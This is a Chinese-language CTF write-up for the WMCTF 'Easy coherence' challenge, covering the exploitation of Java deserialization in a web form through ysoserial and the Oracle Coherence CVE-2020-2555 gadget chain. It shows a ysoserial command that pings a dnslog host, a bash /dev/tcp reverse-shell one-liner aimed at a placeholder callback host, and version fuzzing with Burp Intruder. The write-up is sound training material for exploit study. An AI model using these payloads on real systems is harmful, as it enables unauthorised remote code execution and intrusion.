# Easy coherence

## 题目简述

题目是 Java Web 表单，`object` 参数传入 Base64 编码的 Java 序列化数据。抓包后可见对象流以 `rO0AB` 开头，解码为 `AC ED 00 05`，说明后端会处理 Java serialization。普通 ysoserial 链失败后，题目首页关键词 `coherence` 指向 Oracle Coherence / WebLogic CVE-2020-2555 相关反序列化链，需要 fuzz 不同 Coherence 版本的 gadget 和 serialVersionUID，找到可执行命令的 payload。

## 解题过程

打开题目，首先看到是个表单，字段包括 `name`、`mail`、`phone`、`content` 和 `object`。其中 `object` 是 Base64 形式的 Java 序列化对象，提交抓包看看。

```http
POST /read HTTP/1.1
Host: <challenge-host>
Content-Type: application/x-www-form-urlencoded

name=test&mail=aaa%40qq.com&phone=11111111111&content=aaaaaa&object=<base64-java-serialized-object>
```

提交以后，发现object参数rO0AB字符Base64解码以后到16进制是AC ED 00 05，是java序列化数据，意味着此处是传入序列化数据后端可能会进行反序列化，从返回序列化数据来看是Jdk7u20的gadget。

尝试cc链。

```bash
java -jar ysoserial.jar CommonsCollections2 "ping 5rm6eg.dnslog.cn"|base64
```

返回信息提示提交的数据有问题

未 URL 编码时，表单解析会把 payload 中的特殊字符打乱，后端返回提交数据有问题。对 payload 做 URL encode 后即可正常提交。

但是dnslog没有收到请求，

这里猜测可能gadget不对或题目是docker环境 考虑到无法执行ping等（之前做别的题遇到过），返回再来看题目首页，关键信息coherence，由于之前曝过coherence反序列化漏洞。


1. 编写通用gadget，每个版本的coherence生成序列化suid不一样，就会导致反序列化失败。需要解决suid序列化不一致问题，否则序列化失败异常中断，无法执行命令。
2. 大概有5、6个版本，且有的版本oracle官方不提供下载，题目没有提供是哪个版本的coherence，需要fuzz提交序列化数据，然后盲测gadget，看看哪个gadget可以反序列化成功去执行命令。

反弹shell fuzz object参数 coherence gadget和其他链

这里附上 [poc](https://github.com/Y4er/CVE-2020-2555)。该 PoC 的关键 gadget 链是 `BadAttributeValueExpException.readObject()` 触发 `LimitFilter.toString()`，再进入 `ChainedExtractor.extract()` / `ReflectionExtractor.extract()`，最终通过反射调用 `Runtime.getRuntime().exec()`。它要求目标可用的 Coherence jar 版本与 payload 序列化时一致，否则会出现 `serialVersionUID` 不一致；因此本题需要 fuzz 多个 Coherence 版本。

```bash
bash -i >& /dev/tcp/<callback-host>/<callback-port> 0>&1
```

fuzz

用 Burp Intruder 批量替换 `object` 参数，并在 payload processing 里对 key characters 做 URL encode，避免序列化数据被表单编码破坏。

发现非200的应该是执行成功的，response body中没有输出序列化数据。

对应 payload 返回非 200，同时反弹 shell 收到连接，说明该 Coherence 版本的 gadget 命中。这就很坑了 2333。

最后得flag

WMCTF{70bc3a47c999f11b81db65701274ff2b}

## 方法总结

- 核心技巧：识别 `rO0AB` / `AC ED 00 05` Java 序列化入口，从普通 ysoserial 链 pivot 到 Coherence CVE-2020-2555 gadget，并 fuzz 版本匹配。
- 识别信号：表单参数直接携带 Java serialized object、首页或包名出现 `coherence`、常规 CC/Jdk7u20 链有异常但不执行时，应检查 Coherence/WebLogic 相关 gadget。
- 复用要点：外部 PoC 的关键不是仓库链接，而是 gadget 链和版本条件；WP 中应保留 `serialVersionUID` 不匹配会导致失败这一判断依据。
